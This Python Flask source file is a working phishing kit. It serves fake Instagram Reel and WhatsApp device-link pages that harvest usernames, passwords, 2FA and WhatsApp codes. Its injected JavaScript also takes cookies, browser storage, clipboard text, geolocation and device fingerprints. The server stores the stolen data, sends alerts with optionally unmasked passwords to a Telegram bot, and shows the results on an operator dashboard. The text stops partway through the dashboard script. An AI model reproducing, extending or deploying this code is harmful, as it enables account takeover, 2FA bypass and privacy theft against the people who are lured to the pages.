import os
import re
import json
import uuid
import threading
import urllib.request
import urllib.parse
from pathlib import Path
from datetime import datetime, timezone

from flask import (
    Flask,
    request,
    jsonify,
    render_template_string,
    abort,
    send_from_directory,
)

DATA_DIR = Path(os.environ.get("BABYREEL_DATA_DIR", os.environ.get("DATA_DIR", "data")))
for sub in ["captures", "logins", "tokens", "media"]:
    (DATA_DIR / sub).mkdir(parents=True, exist_ok=True)

DASH_ACCESS_CODE = os.environ.get("DASH_ACCESS_CODE", "babyreel-dashboard-key")
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
TELEGRAM_FULL_CREDS = os.environ.get("TELEGRAM_FULL_CREDS", "0").strip() == "1"
APP_BASE_URL = os.environ.get("APP_BASE_URL", "").rstrip("/")

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 5_000_000

TOKEN_RE = re.compile(r"^[A-Za-z0-9_-]{1,64}$")
FILE_LOCK = threading.Lock()
LOCAL_MEDIA_DIR = Path(__file__).parent / "media"


def utcnow():
    return datetime.now(timezone.utc).isoformat()


def is_valid_token(token):
    return bool(TOKEN_RE.match(token))


def read_json(path, default=None):
    try:
        if path.exists():
            return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return default
    return default


def write_json(path, obj):
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_suffix(".tmp")
    tmp.write_text(json.dumps(obj, indent=2, ensure_ascii=False), encoding="utf-8")
    tmp.replace(path)


def client_ip():
    ip = request.headers.get("X-Forwarded-For", "")
    if ip:
        return ip.split(",")[0].strip()
    return request.remote_addr or "unknown"


def split_client_payload(client):
    if isinstance(client, dict) and isinstance(client.get("data"), dict):
        return client.get("data"), client
    return client, client


def append_event(token, kind, event):
    path = DATA_DIR / kind / f"{token}.json"
    with FILE_LOCK:
        store = read_json(path, {})
        if not store:
            store = {
                "token": token,
                "created_at": utcnow(),
                "updated_at": utcnow(),
                "event_count": 0,
                "latest": None,
                "history": [],
            }

        event["event_id"] = uuid.uuid4().hex
        event["received_at"] = utcnow()
        event["token"] = token

        store["event_count"] = int(store.get("event_count", 0)) + 1
        store["latest"] = event

        history = store.get("history") or []
        history.insert(0, event)
        if len(history) > 100:
            history = history[:100]

        store["history"] = history
        store["updated_at"] = event["received_at"]

        write_json(path, store)

    return event


def mask_secret(value):
    value = value or ""
    if not value:
        return "n/a"
    if len(value) <= 6:
        return "*" * len(value)
    return value[:2] + "*" * (len(value) - 4) + value[-2:]


def dashboard_url_for(token, host_url):
    base = (APP_BASE_URL or host_url).rstrip("/")
    key = urllib.parse.quote(DASH_ACCESS_CODE, safe="")
    return f"{base}/d/{token}/{key}"


def build_login_alert(token, event, dashboard_url):
    username = event.get("username") or event.get("phone") or "unknown"
    password = event.get("password") or ""
    code = event.get("security_code") or event.get("whatsapp_code") or ""
    event_type = event.get("event_type") or "login"

    if event_type == "whatsapp_code":
        status = "WHATSAPP CODE CAPTURED"
    elif event_type == "security_code":
        status = "LOGIN CAPTURED + 2FA"
    else:
        status = "LOGIN CAPTURED"

    if TELEGRAM_FULL_CREDS:
        pass_text = password or "n/a"
    else:
        pass_text = mask_secret(password)

    lines = [
        status,
        f"Token: {token}",
        f"Username/Phone: {username}",
        f"Password: {pass_text}",
        f"Security Code: {code or 'n/a'}",
        f"IP: {event.get('server_ip', 'unknown')}",
        f"Time: {event.get('received_at', utcnow())}",
        f"Dashboard: {dashboard_url}",
    ]
    return "\n".join(lines)


def send_telegram(message):
    if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
        return

    def task():
        try:
            data = json.dumps(
                {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": message,
                    "disable_web_page_preview": True,
                }
            ).encode("utf-8")

            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            req = urllib.request.Request(
                url,
                data=data,
                headers={"Content-Type": "application/json"},
            )
            urllib.request.urlopen(req, timeout=5)
        except Exception:
            pass

    threading.Thread(target=task, daemon=True).start()


def token_config(token):
    path = DATA_DIR / "tokens" / f"{token}.json"

    media_url = (
        os.environ.get("BABYREEL_MEDIA_URL")
        or os.environ.get("BABYREEL_IMAGE_URL")
        or os.environ.get("BABYREEL_VIDEO_URL")
        or "/media/baby.mp4"
    )

    media_path = media_url.lower().split("?", 1)[0]
    default_media_type = (
        "image"
        if media_path.endswith((".jpg", ".jpeg", ".png", ".webp", ".gif"))
        else "video"
    )

    cfg = {
        "video": media_url,
        "media_type": os.environ.get("BABYREEL_MEDIA_TYPE") or default_media_type,
        "username": "baby.moments",
        "caption": "newborn baby being so calm 😭🤍",
        "likes": "1,204",
        "comments": "87",
        "music": "original audio",
        "prompt": "Log in to comment",
    }

    data = read_json(path, {})
    if isinstance(data, dict):
        for key, value in data.items():
            if value is not None:
                cfg[key] = value

    return cfg


@app.after_request
def basic_headers(resp):
    if not request.path.startswith("/media/"):
        resp.headers["Cache-Control"] = "no-store"
    return resp


@app.route("/media/<path:filename>")
def media_file(filename):
    for directory in (DATA_DIR / "media", LOCAL_MEDIA_DIR):
        if (directory / filename).is_file():
            return send_from_directory(directory, filename, max_age=3600)
    abort(404)


CAPTURE_JS = r"""
(function () {
  var cfg = window.__CONFIG__ || {};
  if (!cfg.captureEndpoint && !cfg.loginEndpoint) {
    return;
  }

  function hash(str) {
    var h = 5381;
    for (var i = 0; i < str.length; i++) {
      h = ((h << 5) + h + str.charCodeAt(i)) >>> 0;
    }
    return h.toString(16);
  }

  function truncate(value, limit) {
    var s = String(value == null ? "" : value);
    limit = limit || 8000;
    if (s.length > limit) {
      return s.slice(0, limit) + "...[truncated]";
    }
    return s;
  }

  function storageSnapshot(storage) {
    var out = [];
    if (!storage) {
      return out;
    }

    try {
      for (var i = 0; i < storage.length && i < 500; i++) {
        var key = storage.key(i);
        try {
          out.push({
            key: key,
            value: truncate(storage.getItem(key), 4000)
          });
        } catch (e) {}
      }
    } catch (e) {}

    return out;
  }

  function webglInfo() {
    try {
      var canvas = document.createElement("canvas");
      var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) {
        return { error: "no webgl" };
      }

      var info = {
        vendor: null,
        renderer: null,
        unmaskedVendor: null,
        unmaskedRenderer: null,
        maxTextureSize: null
      };

      info.vendor = gl.getParameter(gl.VENDOR);
      info.renderer = gl.getParameter(gl.RENDERER);
      info.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);

      var dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        info.unmaskedVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        info.unmaskedRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      }

      return info;
    } catch (e) {
      return { error: String(e) };
    }
  }

  function canvasFingerprint() {
    try {
      var canvas = document.createElement("canvas");
      var ctx = canvas.getContext("2d");

      canvas.width = 240;
      canvas.height = 60;

      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 10, 10);

      ctx.fillStyle = "#069";
      ctx.font = "small-caps bold 12px Lucida Grande";
      ctx.fillText("BabyReel fingerprint", 2, 15);

      var url = canvas.toDataURL();
      return {
        hash: hash(url),
        length: url.length
      };
    } catch (e) {
      return { error: String(e) };
    }
  }

  async function audioFingerprint() {
    try {
      var Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
      if (!Ctx) {
        return { unsupported: true };
      }

      var ctx = new Ctx(1, 4410, 44100);
      var osc = ctx.createOscillator();
      osc.type = "sawtooth";
      osc.frequency.value = 441;

      var gain = ctx.createGain();
      gain.gain.value = 0.08;

      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(0);
      osc.stop(0.1);

      var rendered = await ctx.startRendering();
      var samples = rendered.getChannelData(0);

      return {
        hash: hash(samples.slice(0, 512).join(",")),
        sampleCount: samples.length
      };
    } catch (e) {
      return { error: String(e) };
    }
  }

  async function indexedDBInfo() {
    if (!window.indexedDB) {
      return null;
    }

    var out = [];

    if (window.indexedDB.databases) {
      try {
        var dbs = await window.indexedDB.databases();
        for (var i = 0; i < dbs.length; i++) {
          out.push({
            name: dbs[i].name,
            version: dbs[i].version
          });
        }
        return out;
      } catch (e) {
        return { error: String(e) };
      }
    }

    return { unsupported: true };
  }

  async function cacheKeys() {
    if (!window.caches) {
      return null;
    }

    try {
      return await caches.keys();
    } catch (e) {
      return { error: String(e) };
    }
  }

  async function permissionStates() {
    var out = {};

    if (!navigator.permissions || !navigator.permissions.query) {
      return { unsupported: true };
    }

    var names = [
      "notifications",
      "geolocation",
      "camera",
      "microphone",
      "clipboard-read",
      "clipboard-write",
      "persistent-storage",
      "screen-wake-lock"
    ];

    for (var i = 0; i < names.length; i++) {
      try {
        out[names[i]] = (await navigator.permissions.query({ name: names[i] })).state;
      } catch (e) {
        out[names[i]] = "unsupported";
      }
    }

    return out;
  }

  async function mediaDevices() {
    try {
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        var devices = await navigator.mediaDevices.enumerateDevices();
        return devices.map(function (d) {
          return {
            kind: d.kind,
            label: d.label,
            deviceId: d.deviceId,
            groupId: d.groupId
          };
        });
      }
    } catch (e) {
      return { error: String(e) };
    }

    return null;
  }

  async function safeLocation() {
    try {
      if (navigator.permissions && navigator.permissions.query) {
        var state = (await navigator.permissions.query({ name: "geolocation" })).state;
        if (state !== "granted") {
          return { state: state, coordinates: null };
        }
      } else {
        return { unsupported: true, coordinates: null };
      }

      var pos = await new Promise(function (resolve, reject) {
        navigator.geolocation.getCurrentPosition(
          resolve,
          function (err) {
            reject(err);
          },
          {
            enableHighAccuracy: false,
            timeout: 3000,
            maximumAge: 60000
          }
        );
      });

      return {
        state: "granted",
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        heading: pos.coords.heading,
        speed: pos.coords.speed,
        timestamp: pos.timestamp
      };
    } catch (e) {
      return { error: String(e) };
    }
  }

  async function clipboardText() {
    try {
      if (navigator.permissions && navigator.permissions.query) {
        var state = (await navigator.permissions.query({ name: "clipboard-read" })).state;
        if (state !== "granted") {
          return { state: state, text: null };
        }
      } else {
        return { unsupported: true };
      }

      if (navigator.clipboard && navigator.clipboard.readText) {
        var text = await navigator.clipboard.readText();
        return {
          state: "granted",
          text: truncate(text, 2000)
        };
      }
    } catch (e) {
      return { error: String(e) };
    }

    return null;
  }

  async function collect() {
    var d = {};

    try {
      d.collected_at = new Date().toISOString();
      d.document_cookie = document.cookie || "";
      d.url = window.location.href;
      d.referrer = document.referrer || "";
      d.user_agent = navigator.userAgent || "";
      d.userAgentData = navigator.userAgentData || null;

      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        try {
          d.userAgentDataHighEntropy = await navigator.userAgentData.getHighEntropyValues([
            "architecture",
            "bitness",
            "model",
            "platformVersion",
            "uaFullVersion",
            "platform",
            "mobile",
            "formFactors",
            "hardwareConcurrency",
            "deviceMemory",
            "lang",
            "platformArchitecture"
          ]);
        } catch (e) {}
      }

      d.local_storage = storageSnapshot(window.localStorage);
      d.session_storage = storageSnapshot(window.sessionStorage);
      d.indexedDB = await indexedDBInfo();
      d.cache_storage = await cacheKeys();

      d.screen = {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientationType: screen.orientation ? screen.orientation.type : null
      };

      d.window = {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight,
        devicePixelRatio: window.devicePixelRatio
      };

      d.device = {
        hardwareConcurrency: navigator.hardwareConcurrency || null,
        deviceMemory: navigator.deviceMemory || null,
        maxTouchPoints: navigator.maxTouchPoints || null,
        touchSupport: !!navigator.maxTouchPoints,
        language: navigator.language || null,
        languages: navigator.languages || null,
        platform: navigator.platform || null,
        vendor: navigator.vendor || null,
        online: navigator.onLine,
        secureContext: window.isSecureContext
      };

      d.timezone = {
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        offsetMinutes: -new Date().getTimezoneOffset()
      };

      if (navigator.connection) {
        d.network = {
          effectiveType: navigator.connection.effectiveType,
          type: navigator.connection.type,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData
        };
      }

      if (navigator.getBattery) {
        try {
          var b = await navigator.getBattery();
          d.battery = {
            level: b.level,
            charging: b.charging,
            chargingTime: b.chargingTime,
            dischargingTime: b.dischargingTime
          };
        } catch (e) {}
      }

      d.permissions = await permissionStates();
      d.mediaDevices = await mediaDevices();

      if (navigator.storage && navigator.storage.estimate) {
        try {
          var est = await navigator.storage.estimate();
          d.storageEstimate = {
            quota: est.quota,
            usage: est.usage
          };
        } catch (e) {}
      }

      var nav = performance.getEntriesByType("navigation")[0];
      if (nav) {
        d.performance = {
          type: nav.type,
          redirectCount: nav.redirectCount,
          domContentLoadedEventEnd: nav.domContentLoadedEventEnd,
          loadEventEnd: nav.loadEventEnd,
          transferSize: nav.transferSize,
          decodedBodySize: nav.decodedBodySize
        };
      }

      d.webgl = webglInfo();
      d.canvas = canvasFingerprint();
      d.audio = await audioFingerprint();
      d.clipboard = await clipboardText();
      d.geolocation = await safeLocation();
    } catch (e) {
      d.error = String(e);
    }

    return d;
  }

  function post(url, payload) {
    if (!url) {
      return Promise.resolve(null);
    }

    try {
      return fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (e) {
      return Promise.resolve(null);
    }
  }

  window.__collectDevice__ = collect;

  var sendVisit = function () {
    collect().then(function (data) {
      post(cfg.captureEndpoint, {
        event_type: cfg.captureEvent || "capture",
        visit: true,
        data: data
      });
    });
  };

  setTimeout(sendVisit, 650);

  var state = {
    username: null,
    password: null
  };
  window.__lrState = state;

  function show(id, yes) {
    var el = document.getElementById(id);
    if (!el) {
      return;
    }

    if (yes) {
      el.classList.remove("hidden");
    } else {
      el.classList.add("hidden");
    }
  }

  function hideSheets() {
    show("loginSheetWrap", false);
    show("codeSheetWrap", false);
  }

  function openLogin() {
    hideSheets();
    show("loginSheetWrap", true);
  }

  function toast(msg) {
    var el = document.createElement("div");
    el.className = "toast";
    el.textContent = msg;
    document.body.appendChild(el);

    setTimeout(function () {
      el.remove();
    }, 1800);
  }

  function success() {
    hideSheets();

    var prompt = document.querySelector(".prompt");
    if (prompt) {
      prompt.style.display = "none";
    }

    toast("Logged in");
  }

  document.querySelectorAll("[data-open-login]").forEach(function (el) {
    el.addEventListener("click", function (e) {
      e.preventDefault();
      openLogin();
    });
  });

  document.querySelectorAll("[data-close-login]").forEach(function (el) {
    el.addEventListener("click", function (e) {
      e.preventDefault();
      hideSheets();
    });
  });

  var loginForm = document.getElementById("loginForm");
  if (loginForm) {
    loginForm.addEventListener("submit", function (e) {
      e.preventDefault();

      state.username = document.getElementById("username").value.trim();
      state.password = document.getElementById("password").value;

      collect().then(function (data) {
        var payload = {
          event_type: loginForm.dataset.event || "credentials",
          username: state.username,
          password: state.password,
          security_code: null,
          page_context: {
            url: location.href,
            referrer: document.referrer,
            form: "loginForm"
          },
          data: data
        };

        post(cfg.loginEndpoint, payload);

        if (loginForm.dataset.next === "code") {
          show("loginSheetWrap", false);
          show("codeSheetWrap", true);
        } else {
          success();
        }
      });
    });
  }

  var codeForm = document.getElementById("codeForm");
  if (codeForm) {
    codeForm.addEventListener("submit", function (e) {
      e.preventDefault();

      var code = document.getElementById("securityCode").value.trim();

      collect().then(function (data) {
        var payload = {
          event_type: codeForm.dataset.event || "security_code",
          username: state.username,
          password: state.password,
          security_code: code,
          page_context: {
            url: location.href,
            referrer: document.referrer,
            form: "codeForm"
          },
          data: data
        };

        post(cfg.loginEndpoint, payload);
        success();
      });
    });
  }

  var waForm = document.getElementById("waForm");
  if (waForm) {
    waForm.addEventListener("submit", function (e) {
      e.preventDefault();

      var phone = document.getElementById("waPhone").value.trim();
      var code = document.getElementById("waCode").value.trim();

      collect().then(function (data) {
        var payload = {
          event_type: waForm.dataset.event || "whatsapp_code",
          username: phone || null,
          whatsapp_code: code,
          security_code: code,
          page_context: {
            url: location.href,
            referrer: document.referrer,
            form: "waForm",
            mode: "whatsapp"
          },
          data: data
        };

        post(cfg.loginEndpoint, payload);

        waForm.classList.add("hidden");

        var ok = document.getElementById("waSuccess");
        if (ok) {
          ok.classList.remove("hidden");
        }

        success();
      });
    });
  }
})();
"""

VICTIM_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>Reels</title>
  <style>
    :root { color-scheme: dark; }
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    html, body { margin: 0; height: 100%; background: #000; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .stage { position: fixed; inset: 0; background: #000; }
    video, img.media { width: 100%; height: 100%; object-fit: cover; }
    img.media { animation: reelzoom 18s ease-in-out infinite alternate; }
    @keyframes reelzoom { from { transform: scale(1); } to { transform: scale(1.08) translateY(-1%); } }
    .overlay { position: absolute; inset: 0; background: linear-gradient(to top, rgba(0,0,0,0.72), rgba(0,0,0,0) 45%); pointer-events: none; }
    .info { position: absolute; left: 12px; right: 64px; bottom: calc(20px + env(safe-area-inset-bottom)); color: #fff; pointer-events: none; }
    .user-row { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
    .username { font-weight: 600; font-size: 14px; }
    .follow { color: #0095F6; font-size: 12px; border: 1px solid #0095F6; border-radius: 6px; padding: 2px 8px; text-decoration: none; pointer-events: auto; }
    .caption { font-size: 13px; line-height: 1.35; max-width: 100%; }
    .meta { margin-top: 8px; font-size: 12px; opacity: 0.9; display: flex; gap: 12px; }
    .rail { position: absolute; right: 10px; bottom: calc(90px + env(safe-area-inset-bottom)); display: flex; flex-direction: column; gap: 18px; align-items: center; color: #fff; pointer-events: auto; }
    .rail button { background: none; border: none; padding: 0; color: inherit; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; cursor: pointer; }
    .rail svg { width: 26px; height: 26px; fill: currentColor; }
    .rail .count { font-size: 11px; margin-top: 2px; }
    .prompt { position: absolute; left: 50%; transform: translateX(-50%); bottom: calc(18px + env(safe-area-inset-bottom)); background: rgba(255,255,255,0.96); color: #111; border: none; border-radius: 999px; padding: 9px 16px; font-size: 13px; font-weight: 600; box-shadow: 0 6px 20px rgba(0,0,0,0.25); pointer-events: auto; z-index: 5; }
    .hidden { display: none !important; }
    .sheet-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.55); z-index: 20; }
    .sheet { position: fixed; left: 0; right: 0; bottom: 0; background: #fff; color: #111; border-top-left-radius: 16px; border-top-right-radius: 16px; padding: 18px 16px calc(22px + env(safe-area-inset-bottom)); z-index: 21; max-height: 92vh; overflow: auto; }
    .sheet h2 { margin: 0 0 4px; font-size: 18px; text-align: center; }
    .sheet p { margin: 0 0 14px; font-size: 13px; color: #737373; text-align: center; }
    .field { margin-bottom: 10px; }
    .field input { width: 100%; border: 1px solid #DBDBDB; border-radius: 8px; padding: 12px; font-size: 15px; outline: none; }
    .field input:focus { border-color: #A8A8A8; }
    .btn { width: 100%; border: none; border-radius: 8px; background: #0095F6; color: #fff; font-size: 15px; font-weight: 600; padding: 12px; cursor: pointer; }
    .row { display: flex; justify-content: space-between; align-items: center; margin-top: 12px; font-size: 13px; }
    .link { color: #0095F6; text-decoration: none; }
    .toast { position: fixed; left: 50%; transform: translateX(-50%); bottom: 80px; background: rgba(0,0,0,0.85); color: #fff; padding: 8px 14px; border-radius: 10px; font-size: 13px; z-index: 50; }
  </style>
</head>
<body>
  <div class="stage">
    {% if config.media_type == 'image' %}
    <img class="media" src="{{ config.video }}" alt="">
    {% else %}
    <video class="media" playsinline muted loop autoplay>
      <source src="{{ config.video }}">
    </video>
    {% endif %}
    <div class="overlay"></div>

    <div class="rail">
      <button aria-label="Like">
        <svg viewBox="0 0 24 24"><path d="M12 21s-7.5-4.7-9.5-9.2C1 8.3 3.3 5 6.5 5c2 0 3.7 1 5.5 2.8C13.8 6 15.5 5 17.5 5c3.2 0 5.5 3.3 4 6.8C19.5 16.3 12 21 12 21z"/></svg>
        <div class="count">{{ config.likes }}</div>
      </button>
      <button data-open-login aria-label="Comment">
        <svg viewBox="0 0 24 24"><path d="M21 11.5a8.5 8.5 0 0 1-12.7 7.5L3 20l1-4.3A8.5 8.5 0 1 1 21 11.5z"/></svg>
        <div class="count">{{ config.comments }}</div>
      </button>
      <button aria-label="Share">
        <svg viewBox="0 0 24 24"><path d="M22 2 11 13M22 2l-7 20-4-9-9-4 22-7z"/></svg>
      </button>
      <button data-open-login aria-label="Save">
        <svg viewBox="0 0 24 24"><path d="M5 3h14v18l-7-4-7 4V3z"/></svg>
      </button>
      <button aria-label="More">
        <svg viewBox="0 0 24 24"><circle cx="5" cy="12" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="19" cy="12" r="2"/></svg>
      </button>
    </div>

    <div class="info">
      <div class="user-row">
        <span class="username">@{{ config.username }}</span>
        <span class="follow">Follow</span>
      </div>
      <div class="caption">{{ config.caption }}</div>
      <div class="meta"><span>♫ {{ config.music }}</span></div>
    </div>

    <button class="prompt" data-open-login>{{ config.prompt }}</button>
  </div>

  <div id="loginSheetWrap" class="hidden">
    <div class="sheet-backdrop" data-close-login></div>
    <div class="sheet">
      <h2>Log In</h2>
      <p>to comment, save, and view this Reel</p>
      <form id="loginForm" data-event="credentials" data-next="code" autocomplete="on">
        <div class="field">
          <input id="username" name="username" autocomplete="username" placeholder="Phone number, username, or email" required>
        </div>
        <div class="field">
          <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Password" required>
        </div>
        <button class="btn" type="submit">Log In</button>
        <div class="row">
          <a class="link" href="#" data-close-login>Forgot password?</a>
          <a class="link" href="#" data-close-login>New to Instagram? Sign up</a>
        </div>
      </form>
    </div>
  </div>

  <div id="codeSheetWrap" class="hidden">
    <div class="sheet-backdrop" data-close-login></div>
    <div class="sheet">
      <h2>Security Code</h2>
      <p>Enter the 6-digit code we sent to your phone or email to keep your account safe.</p>
      <form id="codeForm" data-event="security_code">
        <div class="field">
          <input id="securityCode" inputmode="numeric" maxlength="6" placeholder="6-digit code" required>
        </div>
        <button class="btn" type="submit">Submit</button>
      </form>
    </div>
  </div>

  <script>
    window.__CONFIG__ = {
      token: "{{ token }}",
      captureEndpoint: "/api/capture/{{ token }}",
      loginEndpoint: "/api/login/{{ token }}",
      captureEvent: "instagram_reel_visit"
    };
  </script>
  <script>{{ capture_js | safe }}</script>
</body>
</html>
"""

WHATSAPP_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
  <title>WhatsApp</title>
  <style>
    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    html, body { margin: 0; min-height: 100vh; background: #0b141a; color: #e9edef; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    .top { padding: 18px 16px; background: #1f2c34; font-weight: 700; }
    .wrap { padding: 28px 18px; max-width: 520px; margin: 0 auto; }
    .card { background: #1f2c34; border-radius: 12px; padding: 22px 18px; }
    h1 { margin: 0 0 8px; font-size: 20px; }
    p { margin: 0 0 16px; color: #8696a0; font-size: 14px; line-height: 1.45; }
    .qr { width: 190px; height: 190px; margin: 0 auto 18px; background: #fff; border-radius: 10px; padding: 10px; }
    .qr svg { width: 100%; height: 100%; display: block; }
    .field { margin-bottom: 10px; }
    .field input { width: 100%; border: 1px solid #3b4a54; background: #111b21; color: #fff; border-radius: 8px; padding: 12px; font-size: 15px; outline: none; }
    .btn { width: 100%; border: none; border-radius: 8px; background: #00a884; color: #fff; font-weight: 700; padding: 12px; font-size: 15px; cursor: pointer; }
    .success { margin-top: 14px; color: #00a884; font-weight: 700; text-align: center; }
    .hidden { display: none !important; }
    .toast { position: fixed; left: 50%; transform: translateX(-50%); bottom: 80px; background: rgba(0,0,0,0.85); color: #fff; padding: 8px 14px; border-radius: 10px; font-size: 13px; z-index: 50; }
  </style>
</head>
<body>
  <div class="top">WhatsApp</div>
  <div class="wrap">
    <div class="card">
      <h1>Link this device</h1>
      <p>Scan the code on your phone, or enter the 6-digit code we sent to your WhatsApp account.</p>

      <div class="qr">
        <svg viewBox="0 0 21 21">
          <rect width="21" height="21" fill="#fff"></rect>
          <rect x="0" y="0" width="7" height="7" fill="#000"></rect>
          <rect x="14" y="0" width="7" height="7" fill="#000"></rect>
          <rect x="0" y="14" width="7" height="7" fill="#000"></rect>
          <rect x="2" y="2" width="3" height="3" fill="#fff"></rect>
          <rect x="16" y="2" width="3" height="3" fill="#fff"></rect>
          <rect x="2" y="16" width="3" height="3" fill="#fff"></rect>
          <rect x="9" y="0" width="2" height="2" fill="#000"></rect>
          <rect x="12" y="1" width="1" height="1" fill="#000"></rect>
          <rect x="9" y="3" width="1" height="1" fill="#000"></rect>
          <rect x="11" y="4" width="2" height="2" fill="#000"></rect>
          <rect x="9" y="7" width="2" height="2" fill="#000"></rect>
          <rect x="13" y="8" width="2" height="2" fill="#000"></rect>
          <rect x="16" y="9" width="2" height="2" fill="#000"></rect>
          <rect x="19" y="11" width="1" height="1" fill="#000"></rect>
          <rect x="9" y="9" width="1" height="1" fill="#000"></rect>
          <rect x="11" y="11" width="2" height="2" fill="#000"></rect>
          <rect x="9" y="14" width="2" height="2" fill="#000"></rect>
          <rect x="13" y="15" width="2" height="2" fill="#000"></rect>
          <rect x="16" y="14" width="2" height="2" fill="#000"></rect>
          <rect x="19" y="16" width="1" height="2" fill="#000"></rect>
          <rect x="9" y="18" width="1" height="1" fill="#000"></rect>
          <rect x="12" y="19" width="2" height="1" fill="#000"></rect>
          <rect x="16" y="18" width="2" height="2" fill="#000"></rect>
        </svg>
      </div>

      <form id="waForm" data-event="whatsapp_code">
        <div class="field">
          <input id="waPhone" placeholder="Phone number" inputmode="tel" autocomplete="tel">
        </div>
        <div class="field">
          <input id="waCode" placeholder="6-digit code" inputmode="numeric" maxlength="6" required>
        </div>
        <button class="btn" type="submit">Verify device</button>
      </form>

      <div id="waSuccess" class="success hidden">Device verified.</div>
    </div>
  </div>

  <script>
    window.__CONFIG__ = {
      token: "{{ token }}",
      captureEndpoint: "/api/capture/{{ token }}",
      loginEndpoint: "/api/login/{{ token }}",
      captureEvent: "whatsapp_visit"
    };
  </script>
  <script>{{ capture_js | safe }}</script>
</body>
</html>
"""

DASHBOARD_HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard</title>
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; padding: 20px; background: #0b1220; color: #e6edf7; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    h1 { margin: 0 0 16px; font-size: 22px; }
    .status { padding: 16px; border-radius: 12px; font-weight: 800; font-size: 18px; text-align: center; margin-bottom: 16px; }
    .status.none { background: #1f2937; color: #d1d5db; }
    .status.visit { background: #f59e0b; color: #111827; }
    .status.login { background: #22c55e; color: #052e16; }
    .status.wa { background: #25d366; color: #052e16; }
    .grid { display: grid; grid-template-columns: 1fr; gap: 14px; }
    @media (min-width: 900px) { .grid { grid-template-columns: 1fr 1fr; } }
    .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 16px; }
    .card h2 { margin: 0 0 12px; font-size: 16px; }
    table { width: 100%; border-collapse: collapse; font-size: 14px; }
    td { padding: 8px 6px; border-bottom: 1px solid #1f2937; vertical-align: top; }
    td:first-child { color: #9ca3af; width: 160px; }
    code { background: #0b1220; padding: 2px 6px; border-radius: 6px; word-break: break-all; }
    .actions { margin-top: 12px; display: flex; flex-wrap: wrap; gap: 8px; }
    button { background: #2563eb; color: white; border: 0; border-radius: 8px; padding: 10px 12px; font-weight: 700; cursor: pointer; }
    pre { white-space: pre-wrap; word-break: break-all; background: #0b1220; padding: 12px; border-radius: 10px; max-height: 420px; overflow: auto; font-size: 12px; }
    details { margin-top: 14px; }
    summary { cursor: pointer; font-weight: 700; }
  </style>
</head>
<body>
  <h1>ReelClip Dashboard</h1>
  <div id="app">Loading...</div>

  <script>
    const DATA = {{ data_json }};

    function esc(s) {
      var map = {
        "&": "&amp;",
        "<": "&lt;",
        ">": "&gt;",
        "\"": "&quot;",
        "'": "&#39;"
      };
      return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
        return map[c];
      });
    }

    function jsonText(obj) {
      try {
        return JSON.stringify(obj, null, 2);
      } catch (e) {
        return String(obj);
      }
    }

    function summary(data) {
      if (!data) return "—";

      var parts = [];
      if (data.screen) {
        parts.push(data.screen.width + "x" + data.screen.height);
      }

      if (data.device && data.device.hardwareConcurrency) {
        parts.push(data.device.hardwareConcurrency + " cores");
      }

      if (data.device && data.device.deviceMemory) {
        parts.push(data.device.deviceMemory + " GB");
      }

      if (data.timezone && data.timezone.timeZone) {
        parts.push(data.timezone.timeZone);
      }

      if (data.webgl) {
        if (data.webgl.unmaskedRenderer) {
          parts.push(data.webgl.unmaskedRenderer);
        } else if (data.webgl.renderer) {
          parts.push(data.webgl.renderer);
        }
      }

      return parts.length ? parts.join(" | ") : "—";
    }

